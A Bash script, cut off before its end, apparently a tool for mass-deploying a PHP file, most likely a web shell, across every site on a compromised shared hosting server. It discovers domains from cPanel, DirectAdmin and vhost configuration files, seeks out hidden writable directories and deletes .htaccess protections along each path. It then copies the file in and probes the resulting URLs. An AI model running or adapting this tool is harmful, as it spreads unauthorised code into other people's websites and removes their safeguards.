#!/bin/bash
# copy.sh — Mass Copy v1 / v2 / v3 (CLI)
# Usage:
#   ./copy.sh -s /path/file.php -b /home/user/public_html [-d] [-o result.txt]
#   ./copy.sh -s /path/file.php -v2 [-d] [-o result.txt]
#   ./copy.sh -s /path/file.php -v3 [-d] [-o result.txt]
#   ./copy.sh -s /path/file.php -m v1|v2|v3 ...

set -u

EXCL="cagefs|caldav|cl.selector|cpaddons|cpanel|cache|etc|logs|lscache|mail|public_ftp|ssl|var|tmp|backup|backups|session|sessions"
WEBROOTS="public_html www htdocs html public web"
VHOST_DIRS="/etc/apache2/sites-enabled /etc/nginx/sites-enabled"

SRC=""
BASE=""
MODE="v1"
DEBUG=0
OUT_FILE=""

RESULT_LINES=()
CONFIRMED=0
DOMAIN_COUNT=0
DISCOVERED=0
RESOLVE_METHOD=""

usage() {
  cat <<'EOF'
MASS COPY (copy.sh) — v1 folder / v2 system / v3 vhost

  -s, --src PATH     Source file (wajib)
  -b, --base PATH    Base path domain source (v1)
  -m, --mode MODE    v1 | v2 | v3  (default: v1)
  -v2, --v2          Mode v2: auto discovery (@system)
  -v3, --v3          Mode v3: apache/nginx sites-enabled (@vhost)
  -d, --debug        Debug log ke stderr
  -o, --out FILE     Simpan hasil ke file
  -h, --help         Bantuan

Contoh:
  ./copy.sh -s /home/u/public_html/x.php -b /home/astrumx/public_html -d
  ./copy.sh -s /tmp/x.php -v2 -d -o spread_result.txt
  ./copy.sh -s /tmp/x.php -v3 -d
  ./copy.sh -s /tmp/x.php -m v3 -o urls.txt
EOF
}

log() {
  if [ "$DEBUG" -eq 1 ]; then
    printf '%s\n' "$*" >&2
  fi
}

is_domain() {
  local n="$1"
  [ -z "$n" ] && return 1
  [ "$n" = "." ] || [ "$n" = ".." ] && return 1
  case "$n" in .*) return 1 ;; esac
  case "$n" in *.*) ;; *) return 1 ;; esac
  echo "$n" | grep -Eiq "^($EXCL)$" && return 1
  return 0
}

is_junk_domain() {
  local d
  d=$(printf '%s' "$1" | tr '[:upper:]' '[:lower:]' | sed 's/^[[:space:]]*//;s/[[:space:]]*$//')
  [ -z "$d" ] || [ "$d" = "." ] || [ "$d" = "localhost" ] && return 0
  case "$d" in .*) return 0 ;; esac
  case "$d" in *.*) ;; *) return 0 ;; esac
  echo "$d" | grep -Eiq '(^|\.)virtuaserver\.com\.br$' && return 0
  echo "$d" | grep -Eiq '\.cpanel3\.' && return 0
  echo "$d" | grep -Eiq '\.cpanel\.site$' && return 0
  echo "$d" | grep -Eiq '\.webhostbox\.net$' && return 0
  echo "$d" | grep -Eiq '(^|\.)cp3\.sh15\.net$' && return 0
  echo "$d" | grep -Fqi 'cpanel3.virtuaserver' && return 0
  echo "$d" | grep -Eiq '\.[0-9]{1,3}-[0-9]{1,3}-[0-9]{1,3}-[0-9]{1,3}\.cpanel\.site$' && return 0
  return 1
}

normalize_vhost_domain() {
  local name
  name=$(printf '%s' "$1" | tr '[:upper:]' '[:lower:]' | sed 's/^[[:space:]"'\'']*//;s/[[:space:]"'\'']*$//')
  [ -z "$name" ] || [ "$name" = "_" ] || [ "$name" = "default" ] || [ "$name" = "default_server" ] && { printf ''; return; }
  case "$name" in
    \**) name=$(printf '%s' "$name" | sed 's/^\*\.*//') ;;
  esac
  [ -z "$name" ] && { printf ''; return; }
  is_junk_domain "$name" && { printf ''; return; }
  printf '%s' "$name"
}

owner_of() {
  local path="$1" owner
  [ -e "$path" ] || { printf ''; return; }
  owner=$(stat -c '%U' "$path" 2>/dev/null || stat -f '%Su' "$path" 2>/dev/null || true)
  printf '%s' "$owner"
}

user_public_html() {
  local user="$1" p
  for p in "/home/$user/public_html" "/home/$user/www" "/home/$user/htdocs"; do
    [ -d "$p" ] && { printf '%s' "$p"; return; }
  done
  printf '%s' "/home/$user/public_html"
}

resolve_docroot() {
  local domain="$1" user="$2" hint="${3:-}" best="" score=-1 p sc ud line
  domain=$(printf '%s' "$domain" | tr '[:upper:]' '[:lower:]')
  [ -n "$hint" ] && [ -d "$hint" ] && {
    best=$(printf '%s' "$hint" | sed 's|/*$||')
    score=$(printf '%s' "$best" | tr -cd '/' | wc -c)
  }
  if [ -n "$user" ] && [ -n "$domain" ]; then
    for p in \
      "/home/$user/public_html/$domain" \
      "/home/$user/$domain" \
      "/home/$user/www/$domain"
    do
      [ -d "$p" ] || continue
      sc=$(printf '%s' "$p" | tr -cd '/' | wc -c)
      case "$p" in *"$domain"*) sc=$((sc + 10)) ;; esac
      if [ "$sc" -gt "$score" ]; then score=$sc; best="$p"; fi
    done
    ud="/var/cpanel/userdata/$user/$domain"
    if [ -f "$ud" ] && [ -r "$ud" ]; then
      while IFS= read -r line || [ -n "$line" ]; do
        case "$line" in
          [Dd]ocument[Rr]oot:*)
            p=$(printf '%s' "$line" | sed 's/^[Dd]ocument[Rr]oot:[[:space:]]*//;s/[[:space:]]*$//')
            [ -n "$p" ] && [ -d "$p" ] || continue
            sc=$(printf '%s' "$p" | tr -cd '/' | wc -c)
            case "$p" in *"$domain"*) sc=$((sc + 10)) ;; esac
            if [ "$sc" -gt "$score" ]; then score=$sc; best="$p"; fi
            ;;
        esac
      done < "$ud"
    fi
  fi
  if [ -n "$user" ]; then
    p=$(user_public_html "$user")
    if [ -d "$p" ]; then
      sc=$(printf '%s' "$p" | tr -cd '/' | wc -c)
      if [ "$sc" -gt "$score" ]; then best="$p"; fi
    fi
  fi
  printf '%s' "$best"
}

is_laravel_app() {
  local d="$1"
  d=$(printf '%s' "$d" | sed 's|/*$||')
  [ -d "$d" ] && [ -d "$d/public" ] || return 1
  [ -f "$d/.env" ] || [ -f "$d/artisan" ]
}

laravel_public_dir() {
  local d parent
  d=$(printf '%s' "$1" | sed 's|/*$||')
  [ -z "$d" ] && { printf ''; return; }
  if [ "$(basename "$d")" = "public" ]; then
    parent=$(dirname "$d")
    is_laravel_app "$parent" && { printf '%s' "$d"; return; }
  fi
  if is_laravel_app "$d"; then
    printf '%s' "$d/public"
    return
  fi
  parent=$(dirname "$d")
  if [ "$parent" != "$d" ] && is_laravel_app "$parent"; then
    printf '%s' "$parent/public"
    return
  fi
  printf ''
}

is_opensid_app() {
  local d="$1" m
  d=$(printf '%s' "$d" | sed 's|/*$||')
  [ -d "$d" ] && [ -d "$d/desa" ] || return 1
  [ -f "$d/catatan_rilis.md" ] && return 0
  for m in rfm pbb donjo-app storage; do
    [ -d "$d/$m" ] && return 0
  done
  return 1
}

opensid_desa_dir() {
  local d parent
  d=$(printf '%s' "$1" | sed 's|/*$||')
  [ -z "$d" ] && { printf ''; return; }
  if [ "$(basename "$d")" = "desa" ]; then
    parent=$(dirname "$d")
    is_opensid_app "$parent" && { printf '%s' "$d"; return; }
  fi
  if is_opensid_app "$d"; then
    printf '%s' "$d/desa"
    return
  fi
  parent=$(dirname "$d")
  if [ "$parent" != "$d" ] && is_opensid_app "$parent"; then
    printf '%s' "$parent/desa"
    return
  fi
  printf ''
}

get_webroot() {
  local domain_dir="$1" wr p lp desa
  domain_dir=$(printf '%s' "$domain_dir" | sed 's|/*$||')
  lp=$(laravel_public_dir "$domain_dir")
  [ -n "$lp" ] && { printf '%s' "$lp"; return; }
  desa=$(opensid_desa_dir "$domain_dir")
  [ -n "$desa" ] && { printf '%s' "$desa"; return; }
  for wr in $WEBROOTS; do
    p="$domain_dir/$wr"
    [ -d "$p" ] && { printf '%s' "$p"; return; }
  done
  printf '%s' "$domain_dir"
}

resolve_copy_webroot() {
  local domain_dir="$1" mode="$2" lp desa
  domain_dir=$(printf '%s' "$domain_dir" | sed 's|/*$||')
  lp=$(laravel_public_dir "$domain_dir")
  [ -n "$lp" ] && { printf '%s' "$lp"; return; }
  desa=$(opensid_desa_dir "$domain_dir")
  [ -n "$desa" ] && { printf '%s' "$desa"; return; }
  if [ "$mode" = "v1" ]; then
    get_webroot "$domain_dir"
    return
  fi
  printf '%s' "$domain_dir"
}

build_url() {
  local scheme="$1" domain="$2" domain_dir="$3" dest="$4" wr prefix rel parent
  domain_dir=$(printf '%s' "$domain_dir" | sed 's|/*$||')
  dest=$(printf '%s' "$dest" | sed 's|\\|/|g')
  for wr in $WEBROOTS; do
    prefix="$domain_dir/$wr/"
    case "$dest" in
      "$prefix"*)
        printf '%s://%s/%s' "$scheme" "$domain" "${dest#"$prefix"}"
        return
        ;;
    esac
  done
  case "$dest" in
    "$domain_dir"/*)
      rel="${dest#"$domain_dir"/}"
      printf '%s://%s/%s' "$scheme" "$domain" "$rel"
      return
      ;;
  esac
  # Laravel: strip /public from URL
  case "$dest" in
    */public/*)
      parent=$(printf '%s' "$dest" | sed -n 's|^\(.*\)/public/.*|\1|p')
      if [ -n "$parent" ] && is_laravel_app "$parent"; then
        rel=$(printf '%s' "$dest" | sed -n 's|^.*/public/\(.*\)|\1|p')
        printf '%s://%s/%s' "$scheme" "$domain" "$rel"
        return
      fi
      ;;
  esac
  # OpenSID: keep /desa/ in URL
  case "$dest" in
    */desa/*)
      parent=$(printf '%s' "$dest" | sed -n 's|^\(.*\)/desa/.*|\1|p')
      if [ -n "$parent" ] && is_opensid_app "$parent"; then
        rel=$(printf '%s' "$dest" | sed -n 's|^.*/desa/\(.*\)|\1|p')
        printf '%s://%s/desa/%s' "$scheme" "$domain" "$rel"
        return
      fi
      ;;
  esac
  rel="${dest#"$domain_dir"/}"
  [ "$rel" = "$dest" ] && rel=$(basename "$dest")
  printf '%s://%s/%s' "$scheme" "$domain" "$rel"
}

find_writable_dirs() {
  local root="$1" max="${2:-12}" min_depth="${3:-2}" max_depth="${4:-14}" tmp
  root=$(printf '%s' "$root" | sed 's|/*$||')
  [ -d "$root" ] || return 0
  tmp=$(mktemp 2>/dev/null) || tmp="/tmp/.copy_sh_$$.cand"
  if find "$root" -maxdepth "$max_depth" -type d \( -name .git -o -name .svn -o -name node_modules -o -name __pycache__ -o -name cache -o -name tmp -o -name logs -o -name session -o -name sessions -o -name backup -o -name backups -o -name sass-cache -o -name .idea \) -prune -o -type d -writable -printf '%d\t%p\n' 2>/dev/null | \
    awk -F'\t' -v min="$min_depth" '$1+0 >= min {print}' | sort -nr -k1,1 | head -n "$max" | cut -f2- > "$tmp"
  then
    :
  else
    find "$root" -maxdepth "$max_depth" -type d 2>/dev/null | while IFS= read -r d; do
      case "$d" in
        */.git/*|*/.svn/*|*/node_modules/*|*/__pycache__/*|*/cache/*|*/tmp/*|*/logs/*) continue ;;
      esac
      [ -w "$d" ] || continue
      local rel="${d#"$root"}"
      local depth=0
      [ -n "$rel" ] && depth=$(printf '%s' "$rel" | tr -cd '/' | wc -c)
      [ "$depth" -ge "$min_depth" ] || continue
      printf '%s\t%s\n' "$depth" "$d"
    done | sort -nr -k1,1 | head -n "$max" | cut -f2- > "$tmp"
  fi
  while IFS= read -r line || [ -n "$line" ]; do
    [ -n "$line" ] || continue
    printf '%s\n' "$line"
  done < "$tmp"
  rm -f "$tmp" 2>/dev/null || true
}

filter_under_root() {
  local root="$1"
  root=$(printf '%s' "$root" | sed 's|/*$||')
  while IFS= read -r p || [ -n "$p" ]; do
    [ -n "$p" ] || continue
    p=$(printf '%s' "$p" | sed 's|/*$||')
    if [ "$p" = "$root" ] || case "$p" in "$root"/*) true ;; *) false ;; esac; then
      printf '%s\n' "$p"
    fi
  done
}

http_status() {
  local url="$1" code=0
  if command -v curl >/dev/null 2>&1; then
    code=$(curl -k -s -o /dev/null -w '%{http_code}' --connect-timeout 2 --max-time 3 -I -L --max-redirs 3 "$url" 2>/dev/null || echo 0)
  elif command -v wget >/dev/null 2>&1; then
    code=$(wget --no-check-certificate --spider -S --timeout=3 "$url" 2>&1 | awk '/HTTP\//{c=$2} END{print c+0}')
  fi
  printf '%s' "${code:-0}"
}

remove_dir_htaccess() {
  local dir="$1" ht
  dir=$(printf '%s' "$dir" | sed 's|/*$||')
  [ -z "$dir" ] && { printf 'missing'; return; }
  ht="$dir/.htaccess"
  [ -e "$ht" ] || { printf 'none'; return; }
  if rm -f "$ht" 2>/dev/null; then
    [ -e "$ht" ] || { printf 'deleted'; return; }
  fi
  if [ -w "$ht" ] 2>/dev/null; then
    : > "$ht" 2>/dev/null && {
      rm -f "$ht" 2>/dev/null
      [ -e "$ht" ] || { printf 'deleted'; return; }
      printf 'cleared'
      return
    }
  fi
  printf 'failed'
}

remove_path_htaccess_chain() {
  local from_root="$1" target_dir="$2" current rel part st deleted=0 cleared=0 failed=0 none=0 dirs=0 details=""
  from_root=$(printf '%s' "$from_root" | sed 's|/*$||')
  target_dir=$(printf '%s' "$target_dir" | sed 's|/*$||')
  [ -z "$from_root" ] || [ -z "$target_dir" ] && { printf 'missing'; return; }

  if [ "$target_dir" = "$from_root" ] || case "$target_dir" in "$from_root"/*) true ;; *) false ;; esac; then
    rel="${target_dir#"$from_root"}"
    rel=$(printf '%s' "$rel" | sed 's|^/||')
    current="$from_root"
    dirs=$((dirs + 1))
    st=$(remove_dir_htaccess "$current")
    case "$st" in deleted) deleted=$((deleted + 1)); details="${details:+$details; }deleted@$current" ;;
      cleared) cleared=$((cleared + 1)); details="${details:+$details; }cleared@$current" ;;
      failed) failed=$((failed + 1)); details="${details:+$details; }failed@$current" ;;
      *) none=$((none + 1)) ;;
    esac
    if [ -n "$rel" ]; then
      IFS='/'
      # shellcheck disable=SC2086
      set -- $rel
      unset IFS
      for part in "$@"; do
        [ -z "$part" ] || [ "$part" = "." ] || [ "$part" = ".." ] && continue
        current="$current/$part"
        dirs=$((dirs + 1))
        st=$(remove_dir_htaccess "$current")
        case "$st" in deleted) deleted=$((deleted + 1)); details="${details:+$details; }deleted@$current" ;;
          cleared) cleared=$((cleared + 1)); details="${details:+$details; }cleared@$current" ;;
          failed) failed=$((failed + 1)); details="${details:+$details; }failed@$current" ;;
          *) none=$((none + 1)) ;;
        esac
      done
    fi
  else
    dirs=1
    st=$(remove_dir_htaccess "$target_dir")
    case "$st" in deleted) deleted=1; details="deleted@$target_dir" ;;
      cleared) cleared=1; details="cleared@$target_dir" ;;
      failed) failed=1; details="failed@$target_dir" ;;
      *) none=1 ;;
    esac
  fi
  printf 'chain dirs=%s deleted=%s cleared=%s failed=%s none=%s%s' \
    "$dirs" "$deleted" "$cleared" "$failed" "$none" \
    "${details:+ [$details]}"
}

smart_copy() {
  local src="$1" dest="$2"
  if cp -f "$src" "$dest" 2>/dev/null && [ -f "$dest" ]; then
    printf 'cp'; return 0
  fi
  if cat "$src" > "$dest" 2>/dev/null && [ -f "$dest" ]; then
    printf 'cat'; return 0
  fi
  if command -v install >/dev/null 2>&1 && install -m 644 "$src" "$dest" 2>/dev/null && [ -f "$dest" ]; then
    printf 'install'; return 0
  fi
  return 1
}

list_vhost_conf_files() {
  local dir="$1" f base real
  [ -d "$dir" ] && [ -r "$dir" ] || return 0
  for f in "$dir"/*; do
    [ -e "$f" ] || continue
    if [ -L "$f" ]; then
      real=$(realpath "$f" 2>/dev/null || readlink -f "$f" 2>/dev/null || true)
      [ -n "$real" ] && f="$real"
    fi
    [ -f "$f" ] && [ -r "$f" ] || continue
    base=$(basename "$f")
    echo "$base" | grep -Eiq '\.(bak|old|dist|example|rpmnew|dpkg-dist)$' && continue
    case "$base" in
      *.conf) ;;
      *) echo "$base" | grep -Eq '^[a-zA-Z0-9_.\-]+$' || continue ;;
    esac
    printf '%s\n' "$f"
  done
}

# Emit lines: domains_csv|docroot|engine
parse_apache_vhosts_file() {
  local file="$1"
  awk '
    BEGIN { IGNORECASE=1; inblock=0; nnames=0; doc="" }
    function trim(s) {
      gsub(/^[[:space:]]+/, "", s)
      gsub(/[[:space:]]+$/, "", s)
      gsub(/^"+|"+$/, "", s)
      return s
    }
    function flush(   i, d) {
      if (doc == "" || nnames == 0) { reset(); return }
      d = ""
      for (i = 1; i <= nnames; i++) {
        if (d != "") d = d ","
        d = d names[i]
      }
      print d "|" doc "|apache"
      reset()
    }
    function reset() { nnames = 0; doc = ""; delete names; inblock = 0 }
    {
      line = $0
      if (line ~ /<VirtualHost/) { if (inblock) flush(); inblock = 1; next }
      if (line ~ /<\/VirtualHost>/) { if (inblock) flush(); next }
      if (!inblock && line !~ /^[[:space:]]*ServerName/ && line !~ /^[[:space:]]*ServerAlias/ && line !~ /^[[:space:]]*DocumentRoot/) next
      if (line ~ /^[[:space:]]*ServerName[[:space:]]+/) {
        sub(/^[[:space:]]*ServerName[[:space:]]+/, "", line)
        n = trim(line)
        if (n != "") { nnames++; names[nnames] = n }
        next
      }
      if (line ~ /^[[:space:]]*ServerAlias[[:space:]]+/) {
        sub(/^[[:space:]]*ServerAlias[[:space:]]+/, "", line)
        n = split(trim(line), a, /[[:space:]]+/)
        for (i = 1; i <= n; i++) if (a[i] != "") { nnames++; names[nnames] = a[i] }
        next
      }
      if (line ~ /^[[:space:]]*DocumentRoot[[:space:]]+/) {
        sub(/^[[:space:]]*DocumentRoot[[:space:]]+/, "", line)
        gsub(/"/, "", line)
        doc = trim(line)
        sub(/\/+$/, "", doc)
        next
      }
    }
    END { if (inblock || nnames > 0) flush() }
  ' "$file" 2>/dev/null
}



parse_nginx_vhosts_file() {
  local file="$1"
  awk '
    BEGIN { depth = 0; inserver = 0; nnames = 0; doc = "" }
    function trim(s) {
      gsub(/^[[:space:]]+/, "", s)
      gsub(/[[:space:]]+$/, "", s)
      gsub(/^"+|"+$/, "", s)
      return s
    }
    function flush(   i, d) {
      if (doc == "" || nnames == 0) return
      d = ""
      for (i = 1; i <= nnames; i++) {
        if (d != "") d = d ","
        d = d names[i]
      }
      print d "|" doc "|nginx"
    }
    {
      line = $0
      sub(/#.*/, "", line)
      if (line ~ /(^|[^a-zA-Z0-9_])server[[:space:]]*\{/) {
        if (inserver && depth == 0) { flush(); nnames = 0; doc = ""; delete names }
        inserver = 1
      }
      nopen = 0; nclose = 0
      for (i = 1; i <= length(line); i++) {
        c = substr(line, i, 1)
        if (c == "{") nopen++
        if (c == "}") nclose++
      }
      if (inserver) {
        if (line ~ /^[[:space:]]*server_name[[:space:]]+/) {
          tmp = line
          sub(/^[[:space:]]*server_name[[:space:]]+/, "", tmp)
          sub(/;.*/, "", tmp)
          n = split(trim(tmp), a, /[[:space:]]+/)
          for (i = 1; i <= n; i++) if (a[i] != "" && a[i] != "_") { nnames++; names[nnames] = a[i] }
        }
        if (line ~ /^[[:space:]]*root[[:space:]]+/) {
          tmp = line
          sub(/^[[:space:]]*root[[:space:]]+/, "", tmp)
          sub(/;.*/, "", tmp)
          gsub(/"/, "", tmp)
          doc = trim(tmp)
          sub(/\/+$/, "", doc)
        }
      }
      depth += nopen - nclose
      if (inserver && depth <= 0) {
        flush()
        inserver = 0; depth = 0; nnames = 0; doc = ""; delete names
      }
    }
  ' "$file" 2>/dev/null
}



while [ $# -gt 0 ]; do
  case "$1" in
    -s|--src) SRC="${2:-}"; shift 2 ;;
    -b|--base) BASE="${2:-}"; shift 2 ;;
    -m|--mode)
      case "$(printf '%s' "${2:-}" | tr '[:upper:]' '[:lower:]')" in
        v1|1|folder) MODE="v1" ;;
        v2|2|system) MODE="v2" ;;
        v3|3|vhost) MODE="v3" ;;
        *) echo "Unknown mode: $2" >&2; usage; exit 1 ;;
      esac
      shift 2
      ;;
    -v2|--v2) MODE="v2"; shift ;;
    -v3|--v3) MODE="v3"; shift ;;
    -d|--debug) DEBUG=1; shift ;;
    -o|--out) OUT_FILE="${2:-}"; shift 2 ;;
    -h|--help) usage; exit 0 ;;
    *) echo "Unknown arg: $1" >&2; usage; exit 1 ;;
  esac
done

if [ -z "$SRC" ]; then
  echo "Error: Source file wajib (-s)." >&2
  usage
  exit 1
fi
if [ "$MODE" = "v1" ] && [ -z "$BASE" ]; then
  echo "Error: Base path wajib (-b) untuk mode v1, atau pakai -v2 / -v3." >&2
  usage
  exit 1
fi
if [ ! -f "$SRC" ]; then
  echo "Error: File sumber tidak ditemukan: $SRC" >&2
  exit 1
fi

FILENAME=$(basename "$SRC")
TARGETS_FILE=$(mktemp 2>/dev/null) || TARGETS_FILE="/tmp/.copy_sh_targets_$$"
: > "$TARGETS_FILE"

collect_v1_targets() {
  local base="$1" ud sub name
  base=$(printf '%s' "$base" | sed 's|/*$||')
  RESOLVE_METHOD="folder-scan"
  if printf '%s' "$base" | grep -q '\*'; then
    for ud in $base; do
      [ -d "$ud" ] || continue
      for sub in "$ud"/*; do
        [ -d "$sub" ] || continue
        name=$(basename "$sub")
        is_domain "$name" || continue
        printf '%s||%s|%s\n' "$name" "$sub" "$name" >> "$TARGETS_FILE"
      done
    done
  else
    for sub in "$base"/*; do
      [ -d "$sub" ] || continue
      name=$(basename "$sub")
      is_domain "$name" || continue
      printf '%s||%s|%s\n' "$name" "$sub" "$name" >> "$TARGETS_FILE"
    done
  fi
}

collect_v2_targets() {
  local methods="" n tmp_domains seen_file line domain user rest doc valias owner path pathkey path_map
  seen_file=$(mktemp 2>/dev/null) || seen_file="/tmp/.copy_sh_seen_$$"
  : > "$seen_file"
  tmp_domains=$(mktemp 2>/dev/null) || tmp_domains="/tmp/.copy_sh_dom_$$"
  : > "$tmp_domains"
  path_map=$(mktemp 2>/dev/null) || path_map="/tmp/.copy_sh_pmap_$$"
  : > "$path_map"

  add_entry() {
    local domain="$1" user="$2" hint="${3:-}" path
    domain=$(printf '%s' "$domain" | tr '[:upper:]' '[:lower:]' | sed 's/^[[:space:]]*//;s/[[:space:]]*$//')
    user=$(printf '%s' "$user" | sed 's/^[[:space:]]*//;s/[[:space:]]*$//')
    is_junk_domain "$domain" && return
    printf '%s' "$user" | grep -Eq '^[a-zA-Z0-9_-]+$' || return
    grep -Fxq "$domain" "$seen_file" 2>/dev/null && return
    printf '%s\n' "$domain" >> "$seen_file"
    path=$(resolve_docroot "$domain" "$user" "$hint")
    [ -z "$path" ] && path=$(user_public_html "$user")
    [ -d "$path" ] || return
    printf '%s|%s|%s\n' "$domain" "$user" "$path" >> "$tmp_domains"
    DISCOVERED=$((DISCOVERED + 1))
  }

  if [ -f /etc/virtual/domainowners ] && [ -r /etc/virtual/domainowners ]; then
    n=0
    while IFS= read -r line || [ -n "$line" ]; do
      line=$(printf '%s' "$line" | sed 's/^[[:space:]]*//;s/[[:space:]]*$//')
      [ -z "$line" ] && continue
      case "$line" in *:*) ;; *) continue ;; esac
      domain=${line%%:*}
      user=${line#*:}
      add_entry "$domain" "$user" ""
      n=$((n + 1))
    done < /etc/virtual/domainowners
    [ "$n" -gt 0 ] && methods="${methods:+$methods+}domainowners"
  fi

  if [ -f /etc/userdatadomains ] && [ -r /etc/userdatadomains ]; then
    n=0
    while IFS= read -r line || [ -n "$line" ]; do
      line=$(printf '%s' "$line" | sed 's/^[[:space:]]*//;s/[[:space:]]*$//')
      [ -z "$line" ] && continue
      case "$line" in *:*) ;; *) continue ;; esac
      domain=${line%%:*}
      rest=${line#*:}
      user=$(printf '%s' "$rest" | sed 's/[^a-zA-Z0-9_-].*//')
      doc=""
      case "$rest" in
        *'=='*)
          user=$(printf '%s' "$rest" | awk -F'==' '{print $1}' | sed 's/^[[:space:]]*//;s/[[:space:]]*$//')
          doc=$(printf '%s' "$rest" | awk -F'==' '{for(i=1;i<=NF;i++) if($i ~ /^\/home\//){print $i; exit}}' | sed 's/^[[:space:]]*//;s/[[:space:]]*$//')
          ;;
      esac
      add_entry "$domain" "$user" "$doc"
      n=$((n + 1))
    done < /etc/userdatadomains
    [ "$n" -gt 0 ] && methods="${methods:+$methods+}userdatadomains"
  fi

  n=0
  if [ -f /etc/named.conf ] && [ -r /etc/named.conf ]; then
    while IFS= read -r line || [ -n "$line" ]; do
      echo "$line" | grep -qi 'zone' || continue
      domain=$(printf '%s' "$line" | sed -n 's/.*[Zz]one[[:space:]]*"\([^"]*\)".*/\1/p' | head -1 | tr '[:upper:]' '[:lower:]')
      [ -z "$domain" ] && continue
      is_junk_domain "$domain" && continue
      case "$domain" in *.*) ;; *) continue ;; esac
      user=""
      valias="/etc/valiases/$domain"
      if [ -e "$valias" ]; then
        owner=$(stat -c '%U' "$valias" 2>/dev/null || stat -f '%Su' "$valias" 2>/dev/null || true)
        [ -n "$owner" ] && [ "$owner" != "root" ] && user="$owner"
      fi
      if { [ -z "$user" ] || [ "$user" = "root" ]; } && [ -f /etc/trueuserdomains ]; then
        user=$(awk -F: -v d="$domain" 'tolower($1)==d {print $2; exit}' /etc/trueuserdomains)
      fi
      [ -z "$user" ] || [ "$user" = "root" ] && continue
      add_entry "$domain" "$user" ""
      n=$((n + 1))
    done < /etc/named.conf
    [ "$n" -gt 0 ] && methods="${methods:+$methods+}named+valiases"
  fi

  while IFS='|' read -r domain user path || [ -n "$domain" ]; do
    [ -n "$domain" ] || continue
    pathkey=$(realpath "$path" 2>/dev/null || printf '%s' "$path")
    if awk -F'\t' -v pk="$pathkey" '$2==pk {found=1} END{exit !found}' "$path_map"; then
      awk -F'\t' -v pk="$pathkey" -v d="$domain" 'BEGIN{OFS="\t"} $2==pk {$4=$4","d} {print}' "$path_map" > "${path_map}.n" && mv "${path_map}.n" "$path_map"
    else
      printf '%s\t%s\t%s\t%s\n' "$domain" "$pathkey" "$user" "$domain" >> "$path_map"
    fi
  done < "$tmp_domains"

  while IFS=$'\t' read -r domain pathkey user domains || [ -n "$domain" ]; do
    [ -n "$domain" ] || continue
    printf '%s|%s|%s|%s\n' "$domain" "$user" "$pathkey" "$domains" >> "$TARGETS_FILE"
  done < "$path_map"

  RESOLVE_METHOD="${methods:-system}"
  rm -f "$seen_file" "$tmp_domains" "$path_map" "${path_map}.n" 2>/dev/null || true
}

collect_v3_targets() {
  local methods="" dir f engine domains_csv docroot eng pathkey domain user domains_norm d first path_map raw got
  path_map=$(mktemp 2>/dev/null) || path_map="/tmp/.copy_sh_v3_$$"
  raw="${path_map}.raw"
  : > "$path_map"
  : > "$raw"

  for dir in $VHOST_DIRS; do
    case "$dir" in *nginx*) engine="nginx" ;; *) engine="apache" ;; esac
    got=0
    while IFS= read -r f || [ -n "$f" ]; do
      [ -n "$f" ] || continue
      if [ "$engine" = "nginx" ]; then
        parse_nginx_vhosts_file "$f"
      else
        parse_apache_vhosts_file "$f"
      fi | while IFS='|' read -r domains_csv docroot eng || [ -n "$domains_csv" ]; do
          [ -n "$domains_csv" ] && [ -n "$docroot" ] || continue
          [ -d "$docroot" ] || continue
          domains_norm=""
          first=""
          oldIFS=$IFS
          IFS=','
          # shellcheck disable=SC2086
          set -- $domains_csv
          IFS=$oldIFS
          for d in "$@"; do
            d=$(normalize_vhost_domain "$d")
            [ -z "$d" ] && continue
            case ",$domains_norm," in *",$d,"*) continue ;; esac
            domains_norm="${domains_norm:+$domains_norm,}$d"
            [ -z "$first" ] && first="$d"
          done
          [ -z "$first" ] && continue
          pathkey=$(realpath "$docroot" 2>/dev/null || printf '%s' "$docroot")
          user=$(owner_of "$pathkey")
          printf '%s	%s	%s	%s
' "$first" "$pathkey" "$user" "$domains_norm"
        done >> "$raw"
      [ -s "$raw" ] && got=1
    done < <(list_vhost_conf_files "$dir")
    [ "$got" -eq 1 ] && methods="${methods:+$methods+}${engine}-sites-enabled"
  done

  if [ ! -s "$raw" ]; then
    RESOLVE_METHOD="${methods:-vhost}"
    rm -f "$path_map" "$raw" 2>/dev/null || true
    return
  fi

  while IFS=$'	' read -r domain pathkey user domains_csv || [ -n "$domain" ]; do
    [ -n "$pathkey" ] || continue
    DISCOVERED=$((DISCOVERED + $(printf '%s' "$domains_csv" | awk -F',' 'NF{print NF; exit}')))
    if awk -F'	' -v pk="$pathkey" '$2==pk{f=1} END{exit !f}' "$path_map"; then
      awk -F'	' -v pk="$pathkey" -v dlist="$domains_csv" -v d0="$domain" -v u="$user" '
        BEGIN{OFS="	"}
        $2==pk {
          n=split(dlist,a,",")
          for(i=1;i<=n;i++){
            if(a[i]=="") continue
            if(index(","$4",", ","a[i]",")==0) $4=$4","a[i]
          }
          if(u!="" && $3=="") $3=u
          if (length(d0)>0 && (length(d0)<length($1) || split(d0,n0,".") < split($1,c,"."))) $1=d0
        }
        {print}
      ' "$path_map" > "${path_map}.n" && mv "${path_map}.n" "$path_map"
    else
      printf '%s	%s	%s	%s
' "$domain" "$pathkey" "$user" "$domains_csv" >> "$path_map"
    fi
  done < "$raw"

  while IFS=$'	' read -r domain pathkey user domains || [ -n "$domain" ]; do
    [ -n "$domain" ] || continue
    printf '%s|%s|%s|%s
' "$domain" "$user" "$pathkey" "$domains" >> "$TARGETS_FILE"
  done < "$path_map"

  RESOLVE_METHOD="${methods:-vhost}"
  rm -f "$path_map" "$raw" "${path_map}.n" 2>/dev/null || true
}


case "$MODE" in
  v3)
    log "Mode: v3 / method: vhost"
    collect_v3_targets
    DOMAIN_COUNT=$(wc -l < "$TARGETS_FILE" 2>/dev/null | tr -d ' ')
    DOMAIN_COUNT=${DOMAIN_COUNT:-0}
    log "Discovered domains=$DISCOVERED unique docroots=$DOMAIN_COUNT method=$RESOLVE_METHOD"
    ;;
  v2)
    log "Mode: v2"
    collect_v2_targets
    DOMAIN_COUNT=$(wc -l < "$TARGETS_FILE" 2>/dev/null | tr -d ' ')
    DOMAIN_COUNT=${DOMAIN_COUNT:-0}
    log "Discovered domains=$DISCOVERED unique docroots=$DOMAIN_COUNT method=$RESOLVE_METHOD"
    ;;
  *)
    log "Mode: v1 / method: folder-scan"
    collect_v1_targets "$BASE"
    DOMAIN_COUNT=$(wc -l < "$TARGETS_FILE" 2>/dev/null | tr -d ' ')
    DOMAIN_COUNT=${DOMAIN_COUNT:-0}
    DISCOVERED=$DOMAIN_COUNT
    log "Domains found: $DOMAIN_COUNT"
    ;;
esac

if [ ! -s "$TARGETS_FILE" ]; then
  echo "Error: Tidak ada domain/user target (mode=$MODE method=$RESOLVE_METHOD)." >&2
